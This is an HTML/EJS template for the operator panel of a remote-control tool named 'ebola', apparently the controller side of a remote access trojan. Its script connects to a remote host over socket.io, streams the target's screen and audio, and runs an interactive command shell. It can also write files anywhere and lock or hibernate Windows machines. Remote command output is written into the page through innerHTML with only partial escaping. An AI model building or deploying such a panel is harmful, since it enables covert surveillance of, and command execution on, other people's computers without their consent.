<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Main</title>

		<link href="https://cdn.jsdelivr.net/npm/daisyui@4.10.2/dist/full.min.css" rel="stylesheet" type="text/css" />
		<script src="https://cdn.tailwindcss.com"></script>
	</head>
	<body>
		<img
			id="stream_full"
			class="z-40 aspect-video rounded-md absolute min-h-[95dvh] top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 min-w-screen hidden" />
		<div class="z-50 badge badge-primary badge-lg absolute bottom-3 right-5 cursor-pointer hidden" id="fullscreen_button_full">&#x26F6;</div>
		<div id="overlay" class="hidden bg-base-100 relative min-h-screen min-w-screen"></div>

		<main class="grid grid-cols-2 h-full w-full p-4 gap-4">
			<div class="w-full col-span-2 flex items-center gap-3">
				<div class="font-medium text-3xl"><%= ebola.name %></div>
				<% if (ebola.status === 'online') { %>
				<div id="status-badge" class="badge badge-xl badge-success relative top-1"></div>
				<% } else if (ebola.status === 'offline') { %>
				<div id="status-badge" class="badge badge-xl badge-error relative top-1"></div>
				<% } %>
			</div>
			<div class="card border-2 border-primary rounded-xl h-full h-full w-full">
				<div class="min-h-2xl h-2xl aspect-video px-3 pt-3 relative">
					<img id="stream" class="aspect-video rounded-md" />
					<audio id="audio" autoplay></audio>
					<div class="z-50 badge badge-primary badge-lg absolute bottom-3 right-5 cursor-pointer" id="fullscreen_button">&#x26F6;</div>
					<span id="nodisplay" class="bg-base-300 rounded-md text-xl text-center aspect-video flex items-center justify-center"
						>No display<br />Start streaming to view remote screen</span
					>
				</div>
				<div class="control-container card-body">
					<h2 class="card-title">Control</h2>
					<div class="controls h-full card-actions flex flex-col gap-6">
						<div class="buttons flex flex-row gap-4">
							<button id="start-stream" class="btn btn-primary">Start Stream</button>
							<button id="stop-stream" class="btn">Stop Stream</button>

							<label class="input input-bordered flex items-center gap-2">
								<svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="w-6 h-6 opacity-70">
									<path
										d="M2,8V4A1,1,0,0,1,3,3H9A1,1,0,0,1,9,5H4V8A1,1,0,0,1,2,8ZM21,3H15a1,1,0,0,0,0,2h5V8a1,1,0,0,0,2,0V4A1,1,0,0,0,21,3ZM3,21H9a1,1,0,0,0,0-2H4V16a1,1,0,0,0-2,0v4A1,1,0,0,0,3,21Zm18-6a1,1,0,0,0-1,1v3H15a1,1,0,0,0,0,2h6a1,1,0,0,0,1-1V16A1,1,0,0,0,21,15ZM6,9v6a1,1,0,0,0,1,1H17a1,1,0,0,0,1-1V9a1,1,0,0,0-1-1H7A1,1,0,0,0,6,9Z" />
								</svg>
								Resolution:
								<input type="text" id="stream_resolution" class="max-w-6 grow" value="2" />
							</label>

							<div class="form-control">
								<label class="label cursor-pointer flex gap-x-4 items-center h-[calc(100%-8px)] p-4 px-2">
									<span class="label-text">Audio</span>
									<input id="stream_audio_toggle" type="checkbox" class="border-2 checkbox checkbox-primary" />
								</label>
							</div>
						</div>
						<div class="information grid my-auto grid-rows-2 auto-cols-auto grid-flow-col min-h-none min-w-none gap-x-10 gap-y-5">
							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
								<label>Time Elapsed</label>
								<span id="minutes">00</span>:<span id="seconds">00</span>
							</div>
							<button class="btn btn-primary" onclick="new_file.showModal()">New File</button>
							<dialog id="new_file" class="modal">
								<div class="modal-box w-11/12 max-w-5xl min-h-[80%]">
									<h3 class="font-bold text-lg">New File</h3>
									<div class="flex flex-col items-center gap-y-6">
										<input
											type="text"
											id="new_file_path"
											placeholder="File Path (example: C:\Folder\ )"
											class="input input-bordered w-full max-w-xs" />
										<input type="text" id="new_file_name" placeholder="File Name" class="input input-bordered w-full max-w-xs" />
										<input type="text" id="new_file_extension" placeholder="File Extension" class="input input-bordered w-full max-w-xs" />

										<label class="form-control w-[80%]">
											<div class="label">
												<span class="label-text">File content</span>
											</div>
											<textarea class="textarea textarea-bordered font-mono min-h-[25rem]" placeholder="Enter Content"></textarea>
										</label>
									</div>
									<div class="modal-action">
										<form method="dialog" class="flex gap-x-4">
											<button id="new_file_create" class="btn btn-primary">Create</button>
											<button class="btn">Close</button>
										</form>
									</div>
								</div>
							</dialog>

							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
								<label>Time Elapsed</label>
								<span id="minutes">00</span>:<span id="seconds">00</span>
							</div>
							<button class="btn btn-primary" onclick="edit_file.showModal()">Edit File</button>
							<dialog id="edit_file" class="modal">
								<div class="modal-box w-11/12 max-w-5xl min-h-[80%]">
									<h3 class="font-bold text-lg">Edit File</h3>
									<div class="flex flex-col items-center gap-y-6">
										<input type="text" id="edit_file_path" placeholder="File Name" class="input input-bordered w-full max-w-xs" />
										<input type="text" id="edit_file_name" placeholder="File Extension" class="input input-bordered w-full max-w-xs" />
										<input
											type="text"
											id="edit_file_extension"
											placeholder="File Path (example: C:\Folder\t.txt)"
											class="input input-bordered w-full max-w-xs" />

										<label class="form-control w-[80%]">
											<div class="label">
												<span class="label-text">File content</span>
											</div>
											<textarea class="textarea textarea-bordered font-mono min-h-[25rem]" placeholder="Enter Content"></textarea>
										</label>
									</div>
									<div class="modal-action flex gap-x-4">
										<button class="btn btn-primary">Edit</button>
										<form method="dialog">
											<button class="btn">Close</button>
										</form>
									</div>
								</div>
							</dialog>

							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
								<label>Time Elapsed</label>
								<span id="minutes">00</span>:<span id="seconds">00</span>
							</div>
							<button
								class="btn btn-neutral"
								onclick="socket.emit('command_input', 'C:\\Windows\\System32\\Rundll32.exe user32.dll,LockWorkStation')">
								Lock Screen
							</button>

							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
								<label>Time Elapsed</label>
								<span id="minutes">00</span>:<span id="seconds">00</span>
							</div>
							<button class="btn btn-error" onclick="socket.emit('command_input', 'C:\\Windows\\System32\\shutdown.exe /h /t 0')">
								Shut Down (Hibernate)
							</button>
						</div>
					</div>
				</div>
			</div>
			<div class="cmds gap-3 border-2 border-primary rounded-xl h-full max-h-[inherit] w-full p-3">
				<div class="log w-full h-full overflow-x-auto overflow-y-auto">
					<div id="command-log" class="font-mono border-[2px] px-2 pt-1 border-neutral rounded-md min-h-full w-full overflow-y-auto">
						<p id="cmd-prompt">
							<span class="font-bold dir">Loading...</span
							><input
								type="text"
								class="bg-transparent border-none focus:outline-none font-mono w-0"
								onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';"
								oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';" />
						</p>
					</div>
				</div>
			</div>
		</main>

		<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
		<script>
			//#region socket init
			const socket = io('http://<%= ebola.host %>:<%= ebola.port %>', { transports: ['websocket'] });

			document.addEventListener('DOMContentLoaded', event => {
				let counter = 0;
				if (!socket.connected) {
					let checkConnected = setInterval(() => {
						counter += 1;

						if (counter === 10 && !socket.connected) {
							changeStatus('offline');
							clearInterval(checkConnected);
						}
					}, 100);
				}
			});

			socket.on('disconnect', async () => {
				await changeStatus('offline');
			});
			socket.on('connect', async () => {
				await changeStatus('online');
				document.getElementById('stream_audio_toggle').removeAttribute('checkbox');
			});

			let currentStream = 'stream';
			socket.on('stream_data', data => {
				document.getElementById(currentStream).setAttribute('src', `data:image/png;base64,${data}`);

				if (document.getElementById('stream').style.display !== 'flex') {
					document.getElementById('stream').style.display = 'flex';
					document.getElementById('nodisplay').style.display = 'none';
				}
			});

			async function changeStatus(status) {
				const badge = document.getElementById('status-badge');
				status === 'online'
					? (badge.classList.add('badge-success'), badge.classList.remove('badge-error'))
					: (badge.classList.add('badge-error'), badge.classList.remove('badge-success'));

				const data = { status: status };

				await fetch('http://localhost:4100/control/<%= ebola.name %>', {
					method: 'POST',
					body: JSON.stringify(data),
					headers: {
						'Content-Type': 'application/json',
					},
				});
			}
			//#endregion

			//#region stream audio
			socket.on('audio_data', async data => {
				// Convert the received data to a Blob with a supported MIME type
				const audioBlob = new Blob([data], { type: 'audio/wav' });
				const audioElement = document.getElementById('audio');
				const audioURL = URL.createObjectURL(audioBlob);

				// Set the source and play the audio
				audioElement.src = audioURL;
				audioElement.load(); // Ensure it's loaded before playing
				audioElement.play(); // Play the audio
			});
			//#endregion

			//#region stream events
			let streamResValue = document.getElementById('stream_resolution').value;

			document.addEventListener('DOMContentLoaded', event => {
				document.getElementById('stream').style.display = 'none';
			});

			document.getElementById('start-stream').addEventListener('click', () => {
				if (streamResValue === '') streamResValue = '4';
				socket.emit('start_stream', streamResValue);
				document.getElementById('stream').style.display = 'flex';
				document.getElementById('nodisplay').style.display = 'none';
			});
			document.getElementById('stop-stream').addEventListener('click', () => {
				socket.emit('stop_stream');
				setTimeout(() => {
					document.getElementById('stream').style.display = 'none';
					document.getElementById('nodisplay').style.display = 'flex';
				}, 200);
			});

			document.getElementById('stream_audio_toggle').addEventListener('click', event => {
				socket.emit('audio_toggle', '');
				if (event.target.getAttribute('checkbox')) event.target.removeAttribute('checkbox');
				else event.target.setAttribute('checkbox', 'checked');
			});

			document.getElementById('stream_resolution').addEventListener('input', event => {
				streamResValue = event.target.value;
				if (!isNaN(parseInt(streamResValue))) {
					if (streamResValue < 1) {
						streamResValue = '1';
						event.target.value = '1';
					} else if (streamResValue > 8) {
						streamResValue = '8';
						event.target.value = '8';
					}
				}
			});
			//#endregion

			//#region commands
			const commandLog = document.getElementById('command-log');
			let workingDir = 'Loading...';

			commandLog.addEventListener('click', () => {
				commandLog.querySelector('#cmd-prompt:last-child input').focus();
			});

			commandLog.addEventListener('keypress', event => {
				if (event.key === 'Enter') {
					if (event.target.value === 'clear' || event.target.value === 'cls') {
						commandLog.innerHTML = `<p id="cmd-prompt"><span class="font-bold dir">${workingDir}></span><input type="text" class="bg-transparent border-none focus:outline-none font-mono w-0" onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';" oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';" /></p>`;
					} else {
						let command = commandLog.querySelector('#cmd-prompt:last-child input').value;
						if (command.startsWith('s32')) command = command.replace('s32', 'C:\\Windows\\System32');

						socket.emit('command_input', command);
					}
					commandLog.querySelector('#cmd-prompt:last-child input').focus();
				}
			});

			socket.on('command_dir', dir => {
				workingDir = dir;
				document.querySelector('#command-log p:last-child span.dir').textContent = workingDir + '>';
			});

			socket.on('command_output', output => {
				if (output.trim().length >= 1) {
					console.log(`output normal: ${output}`);
					const re = /<(\w+)>/gm;
					const replacement = '< $1 >';
					output = output.replace(re, replacement);

					commandLog.querySelector('#cmd-prompt input').defaultValue = commandLog.querySelector('#cmd-prompt input').value;
					commandLog.innerHTML += `<p><span>${output.split('\n').join('<br>')}</span></p>`;
					commandLog.innerHTML += `<p id="cmd-prompt"><span class="font-bold dir">${workingDir}></span><input type="text" class="bg-transparent border-none focus:outline-none font-mono w-0" onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';" oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';"/></p>`;
					commandLog.querySelector('#cmd-prompt:last-child input').focus();
				}
			});
			socket.on('command_output_error', output => {
				if (output.trim().length >= 1) {
					console.log(`output error: ${output}`);
					const re = /<(\w+)>/gm;
					const replacement = '< $1 >';
					output = output.replace(re, replacement);

					commandLog.querySelector('#cmd-prompt input').defaultValue = commandLog.querySelector('#cmd-prompt input').value;
					commandLog.innerHTML += `<p><span class="text-red-500">${output.split('\n').join('<br>')}</span></p>`;
					commandLog.innerHTML += `<p id="cmd-prompt"><span class="font-bold dir">${workingDir}></span><input type="text" class="bg-transparent border-none focus:outline-none font-mono w-0" onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';" oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';" /></p>`;
					commandLog.querySelector('#cmd-prompt:last-child input').focus();
				}
			});
			//#endregion

			//#region misc
			document.getElementById('new_file_create').addEventListener('click', event => {
				const directory = document.getElementById('new_file_path').value;
				const fileName = document.getElementById('new_file_name').value;
				const fileExtension = document.getElementById('new_file_extension').value;
				const content = document.querySelector('textarea').value;

				socket.emit('create_file', { directory, fileName, fileExtension, content });
			});

			document.getElementById('fullscreen_button').addEventListener('click', event => {
				currentStream = 'stream_full';
				document.getElementById('stream_full').classList.remove('hidden');
				document.getElementById('fullscreen_button_full').classList.remove('hidden');
				document.getElementById('overlay').classList.remove('hidden');
				document.body.classList.add('overflow-hidden');
			});

			document.getElementById('fullscreen_button_full').addEventListener('click', event => {
				currentStream = 'stream';
				document.getElementById('stream_full').classList.add('hidden');
				document.getElementById('fullscreen_button_full').classList.add('hidden');
				document.getElementById('overlay').classList.add('hidden');
				document.body.classList.remove('overflow-hidden');
			});
			//#endregion
		</script>
	</body>
</html>
